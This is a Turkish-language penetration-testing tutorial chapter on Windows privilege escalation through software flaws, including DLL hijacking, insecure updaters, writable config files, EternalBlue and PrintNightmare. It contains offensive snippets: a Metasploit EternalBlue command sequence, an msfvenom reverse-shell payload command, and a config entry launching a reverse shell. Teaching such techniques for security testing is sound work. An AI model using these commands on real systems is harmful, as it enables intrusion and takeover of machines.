**Windows Privilege Escalation: Software Exploitation (Yazılım Zafiyetlerinin Kullanılması)**

Windows sistemlerinde yüklü yazılımlar ve uygulamalardaki zafiyetler, saldırganlar tarafından yetki yükseltme amacıyla kullanılabilir. Özellikle üçüncü taraf yazılımlar veya varsayılan sistem uygulamalarındaki açıklar, kötü niyetli kullanıcılar için bir fırsat sunar. Bu bölümde yazılım zafiyetlerinin nasıl tespit edilip kullanılabileceği detaylı şekilde açıklanmıştır.

---

### **7.1. Üçüncü Taraf Yazılım Zafiyetleri**

Üçüncü taraf yazılımlar, genellikle sistemde açık oluşturabilecek güvenlik zafiyetlerine sahiptir. Bu zafiyetler, güncel olmayan yazılımlar veya yanlış yapılandırmalardan kaynaklanabilir.

#### **Tespit**
1. Sistemde yüklü olan tüm yazılımları listelemek için:
   ```cmd
   wmic product get name,version
   ```
2. Yüklü yazılımları Exploit-DB veya CVE Details gibi platformlarda arayarak zafiyetleri kontrol edin.

#### **Kötüye Kullanma**
- Bulunan zafiyetler için exploit oluşturun veya mevcut bir exploit kullanın.
- Örneğin, Adobe Reader veya VMware Tools gibi bilinen uygulamalardaki açıklar için exploit'leri uygulayın.

---

### **7.2. Güncelleyici Mekanizmaların Kötüye Kullanılması (Insecure Updaters)**

Bazı yazılımlar, güncellemeleri HTTPS yerine HTTP üzerinden indirir veya imza doğrulaması yapmaz. Bu durum, güncelleme sırasında saldırganların zararlı dosyalar yüklemesine olanak tanır.

#### **Tespit**
1. Güncelleme sırasında ağ trafiğini izlemek için Wireshark veya tcpdump kullanın.
2. HTTP üzerinden güncelleme yapan yazılımları tespit edin.

#### **Kötüye Kullanma**
- **Man-in-the-Middle (MitM):** HTTP güncelleme bağlantısını ele geçirerek zararlı bir dosya sunun.
- **Exploit**: Güncelleyici tarafından indirilen dosyaları kötü niyetli payload ile değiştirin.

---

### **7.3. DLL Hijacking (DLL Kaçırma)**

DLL Hijacking, uygulamaların çalıştırılması sırasında eksik veya zafiyetli DLL'leri kötüye kullanarak kod çalıştırmayı hedefler.

#### **Tespit**
1. Process Monitor (ProcMon) ile bir uygulamanın çalıştırdığı DLL'leri izleyin.
2. Eksik DLL'leri tespit edin.

#### **Kötüye Kullanma**
1. Eksik olan DLL'yi zararlı bir DLL ile değiştirin veya oluşturun.
2. DLL'yi hedef uygulamanın çalıştırdığı dizine yerleştirin.
3. Uygulamayı başlatarak zararlı kodun çalışmasını sağlayın.

---

### **7.4. Yazılabilir Yapılandırma Dosyaları**

Birçok yazılım, yapılandırma dosyalarını düz metin olarak saklar. Bu dosyaların yazılabilir olması, saldırganların zararlı bir komut eklemesine izin verebilir.

#### **Tespit**
1. Yazılabilir yapılandırma dosyalarını bulmak için:
   ```cmd
   icacls "C:\Path\to\ConfigFiles"
   ```
2. Özellikle çalıştırılabilir dosyalarla ilişkilendirilmiş yapılandırma dosyalarına odaklanın.

#### **Kötüye Kullanma**
1. Yapılandırma dosyasına zararlı bir komut ekleyin:
   ```ini
   [Startup]
   Command=C:\reverse_shell.exe
   ```
2. Uygulamayı yeniden başlatarak payload'ı tetikleyin.

---

### **7.5. Tersine Mühendislik (Reverse Engineering)**

Yazılımların tersine mühendislik yoluyla analiz edilmesi, güvenlik açıklarını bulmayı sağlar.

#### **Araçlar**
- **IDA Pro / Ghidra:** Yazılımların assembly kodlarını analiz etmek için.
- **OllyDbg / x64dbg:** Debugging işlemleri için.

#### **Kötüye Kullanma**
1. Bir uygulamanın binary dosyasını tersine mühendislik araçlarıyla analiz edin.
2. Kendi exploit'inizi yazın veya mevcut bir açığı manipüle edin.

---

### **7.6. Bilinen Yazılım Zafiyetlerinin Kullanılması**

Microsoft ve üçüncü taraf yazılımlarda zaman zaman kritik zafiyetler bulunur. Bu zafiyetler için genellikle exploit scriptleri hazırlanır.

#### **Örnekler**
- **MS17-010 (EternalBlue):** SMB protokolündeki zafiyeti kullanarak SYSTEM yetkisi elde etme.
- **CVE-2021-34527 (PrintNightmare):** Windows Print Spooler zafiyetini kullanarak SYSTEM yetkisi elde etme.

#### **Kötüye Kullanma**
1. Metasploit veya Impacket modüllerini kullanarak zafiyeti sömürün:
   ```cmd
   msfconsole
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST [target_ip]
   exploit
   ```

---

### **7.7. Stack veya Heap Buffer Overflow (Bellek Taşması)**

Bazı yazılımlar, stack veya heap tabanlı bellek taşması açıklarına sahiptir. Bu açıklar, saldırganların kod çalıştırmasına olanak tanır.

#### **Tespit**
1. Yazılımı fuzzing araçlarıyla test edin.
   - **AFL (American Fuzzy Lop):** Yazılımı otomatik olarak fuzz etmek için kullanılabilir.
2. Hata mesajlarını veya crash raporlarını analiz edin.

#### **Kötüye Kullanma**
1. Eksploit scripti yazın veya mevcut bir script kullanın.
2. Payload'ınızı hedef yazılımın açığına göre hazırlayın:
   ```cmd
   msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > exploit.exe
   ```

---

### **7.8. Yazılımların Geçici Dosyalarının Kötüye Kullanılması**

Bazı yazılımlar geçici dosyalarını (temporary files) düzgün bir şekilde güvence altına almaz. Bu dosyalara yazılabilir durumda olan bir saldırgan, zararlı kod ekleyebilir.

#### **Tespit**
1. Geçici dosyaların oluşturulduğu dizini kontrol edin:
   ```cmd
   dir %TEMP%
   ```
2. Yazılabilir dosya veya dizinleri tespit edin.

#### **Kötüye Kullanma**
1. Yazılabilir bir geçici dosyayı bulun ve değiştirin.
2. Yazılımın bu dosyayı okumasını sağlayarak kodunuzu çalıştırın.

---

### **Araçlar**
- **Metasploit Framework:** Bilinen yazılım zafiyetleri için modüller içerir.
- **Exploit-DB:** Yazılım zafiyetlerini araştırmak için.
- **ProcMon:** Yazılım davranışlarını izlemek için.
- **IDA Pro / Ghidra:** Tersine mühendislik ve exploit geliştirme için.
- **Immunity Debugger:** Exploit geliştirme sürecinde debugging işlemleri için.

---
